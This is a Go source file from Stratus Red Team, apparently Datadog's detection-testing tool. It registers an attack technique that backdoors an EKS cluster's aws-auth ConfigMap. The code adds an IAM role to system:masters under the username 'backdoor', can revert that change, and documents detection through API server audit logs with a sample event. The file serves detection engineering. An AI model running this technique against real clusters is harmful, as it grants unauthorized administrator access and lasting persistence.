package eks

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"gopkg.in/yaml.v3"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "eks.persistence.backdoor-aws-auth-configmap",
		FriendlyName: "Backdoor aws-auth EKS ConfigMap",

		Description: `
Backdoors the aws-auth ConfigMap in an EKS cluster to grant access to the cluster to a specific role.

Warm-up:

- Create an IAM role

Detonation:

- Add an entry to the aws-auth ConfigMap to grant administrator access to the cluster to the role

References: 

- https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#authorization-the-aws-auth-configmap-deprecated
- https://docs.aws.amazon.com/eks/latest/userguide/auth-configmap.html
`,
		Detection: `
Through EKS API Server audit logs, by looking for changes to the aws-auth ConfigMap in the kube-system namespace. Here's what a relevant audit event looks like:

` + codeBlock + `json
{
  "objectRef": {
    "apiVersion": "v1",
    "resource": "configmaps",
    "name": "aws-auth"
  },
  "requestURI": "/api/v1/namespaces/kube-system/configmaps/aws-auth",
  "requestObject": {
    "metadata": {
      "resourceVersion": "184358280",
      "name": "aws-auth",
      "namespace": "kube-system",
      "creationTimestamp": "2022-07-20T13:13:30Z"
    },
    "apiVersion": "v1",
    "data": {
      "mapRoles": "- groups:\n    - system:masters\n  rolearn: arn:aws:iam::012345678901:role/account-admin\n  username: cluster-admin-{{SessionName}}\n- groups:\n    - system:bootstrappers\n    - system:nodes\n  rolearn: arn:aws:iam::012345678901:role/eksctl-cluser-NodeInstanceRole\n  username: system:node:{{EC2PrivateDNSName}}\n- groups:\n    - system:masters\n  rolearn: arn:aws:iam::012345678901:role/stratus-red-team-eks-backdoor-aws-auth-role\n  username: backdoor\n"
    },
    "kind": "ConfigMap"
  }
}
` + codeBlock + `
`,
		Platform:                   stratus.EKS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	k8sClient := providers.EKS().GetK8sClient()
	roleArn := params["role_arn"]

	log.Println("Reading aws-auth ConfigMap in the kube-system namespace")
	awsAuthConfigMap, err := NewAwsAuthConfigMap(k8sClient)
	if err != nil {
		return err
	}

	log.Println("Backdooring aws-auth ConfigMap to grant access to the cluster to the role ", roleArn)
	awsAuthConfigMap.AddRoleMapping(roleArn, "backdoor", []string{"system:masters"})
	if err := awsAuthConfigMap.Save(); err != nil {
		return err
	}

	log.Println("The aws-auth ConfigMap has been successfully backdoored and is shown below:\n\n", awsAuthConfigMap.configMap.Data["mapRoles"])
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	k8sClient := providers.EKS().GetK8sClient()
	roleArn := params["role_arn"]

	log.Println("Reading aws-auth ConfigMap in the kube-system namespace")
	awsAuthConfigMap, err := NewAwsAuthConfigMap(k8sClient)
	if err != nil {
		return err
	}

	log.Println("Removing aws-auth ConfigMap mapping for role", roleArn)
	awsAuthConfigMap.RemoveRoleMapping(roleArn)
	if err := awsAuthConfigMap.Save(); err != nil {
		return err
	}
	return nil
}

// Utility code to interact with the aws-auth ConfigMap
type awsAuthConfigMapEntry struct {
	Groups   []string `yaml:"groups"`
	RoleARN  string   `yaml:"rolearn"`
	Username string   `yaml:"username"`
}

type AwsAuthConfigMap struct {
	k8sClient    *kubernetes.Clientset
	configMap    *corev1.ConfigMap
	roleMappings *[]awsAuthConfigMapEntry
}

func NewAwsAuthConfigMap(k8sClient *kubernetes.Clientset) (*AwsAuthConfigMap, error) {
	awsAuth := &AwsAuthConfigMap{k8sClient: k8sClient}
	configMap, err := k8sClient.CoreV1().ConfigMaps("kube-system").Get(context.Background(), "aws-auth", metav1.GetOptions{})
	if err != nil {
		return nil, fmt.Errorf("failed to read aws-auth ConfigMap: %w", err)
	}
	awsAuth.configMap = configMap

	rawRoleMapping, ok := configMap.Data["mapRoles"]
	if !ok {
		return nil, fmt.Errorf("'mapRoles' field is not present in aws-auth ConfigMap")
	}

	var roleMappings []awsAuthConfigMapEntry
	err = yaml.Unmarshal([]byte(rawRoleMapping), &roleMappings)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal aws-auth ConfigMap: %w", err)
	}
	awsAuth.roleMappings = &roleMappings
	return awsAuth, nil
}

func (m *AwsAuthConfigMap) AddRoleMapping(roleArn string, username string, groups []string) {
	*m.roleMappings = append(*m.roleMappings, awsAuthConfigMapEntry{
		Groups:   groups,
		RoleARN:  roleArn,
		Username: username,
	})
}

func (m *AwsAuthConfigMap) RemoveRoleMapping(roleArn string) {
	roleMappings := *m.roleMappings
	for i, roleMapping := range roleMappings {
		if roleMapping.RoleARN == roleArn {
			*m.roleMappings = append(roleMappings[:i], roleMappings[i+1:]...)
			return
		}
	}
}

func (m *AwsAuthConfigMap) Save() error {
	result, err := yaml.Marshal(m.roleMappings)
	if err != nil {
		return fmt.Errorf("failed to marshal aws-auth ConfigMap: %w", err)
	}
	m.configMap.Data["mapRoles"] = string(result)
	_, err = m.k8sClient.CoreV1().ConfigMaps("kube-system").Update(context.Background(), m.configMap, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("failed to update aws-auth ConfigMap: %w", err)
	}
	return nil
}
